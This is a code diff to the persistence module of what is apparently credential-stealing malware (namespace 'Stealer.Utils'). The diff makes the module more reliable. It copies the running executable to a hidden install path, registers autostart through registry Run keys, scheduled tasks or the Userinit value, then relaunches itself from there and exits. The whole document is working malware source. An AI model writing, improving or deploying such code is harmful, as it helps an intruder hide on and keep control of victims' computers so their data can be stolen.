@@ -73,16 +73,35 @@ namespace Stealer.Utils
             }
         }
 
+        private static string GetCurrentExePath()
+        {
+            // Assembly.Location is more reliable than MainModule.FileName
+            try
+            {
+                string loc = System.Reflection.Assembly.GetEntryAssembly()?.Location;
+                if (!string.IsNullOrEmpty(loc) && File.Exists(loc)) return loc;
+            }
+            catch { }
+            try
+            {
+                string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                if (!string.IsNullOrEmpty(loc) && File.Exists(loc)) return loc;
+            }
+            catch { }
+            try { return Process.GetCurrentProcess().MainModule.FileName; }
+            catch { }
+            return null;
+        }
+
         public static void Install()
         {
             try
             {
-                string methods = Config.Persistence.ToLower();
-                if (string.IsNullOrEmpty(methods) || methods == "none") return;
-
                 EnsurePaths();
 
-                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
+                string currentPath = GetCurrentExePath();
+                if (string.IsNullOrEmpty(currentPath)) return;
+
                 bool alreadyInstalled = currentPath.Equals(_installPath, StringComparison.OrdinalIgnoreCase);
 
                 if (!alreadyInstalled)
@@ -91,29 +110,40 @@ namespace Stealer.Utils
                         Directory.CreateDirectory(_installDir);
 
                     File.Copy(currentPath, _installPath, true);
+                    try { File.SetAttributes(_installPath, FileAttributes.Hidden); } catch { }
 
-                    // Set hidden + system attributes to blend in
-                    try { File.SetAttributes(_installPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
-                }
+                    // Set up persistence pointing to install path
+                    string methods = Config.Persistence.ToLower();
+                    if (!string.IsNullOrEmpty(methods) && methods != "none")
+                    {
+                        if (methods.Contains("registry")) try { RegistryRun(); } catch { }
+                        if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
+                        if (methods.Contains("userinit"))  try { Userinit(); } catch { }
+                    }
 
-                if (methods.Contains("registry")) try { RegistryRun(); } catch { }
-                if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
-                if (methods.Contains("userinit"))  try { Userinit(); } catch { }
-
-                // Restart from install path so all future runs come from there
-                if (!alreadyInstalled)
-                {
+                    // Relaunch from install path and exit — only exit if launch succeeded
                     try
                     {
-                        Process.Start(new ProcessStartInfo
+                        var p = Process.Start(new ProcessStartInfo
                         {
-                            FileName         = _installPath,
-                            UseShellExecute  = false,
-                            CreateNoWindow   = true,
+                            FileName        = _installPath,
+                            UseShellExecute = false,
+                            CreateNoWindow  = true,
                         });
+                        if (p != null) Environment.Exit(0);
                     }
                     catch { }
-                    Environment.Exit(0);
+                }
+                else
+                {
+                    // Already running from install path — just ensure persistence is registered
+                    string methods = Config.Persistence.ToLower();
+                    if (!string.IsNullOrEmpty(methods) && methods != "none")
+                    {
+                        if (methods.Contains("registry")) try { RegistryRun(); } catch { }
+                        if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
+                        if (methods.Contains("userinit"))  try { Userinit(); } catch { }
+                    }
                 }
             }
             catch { }
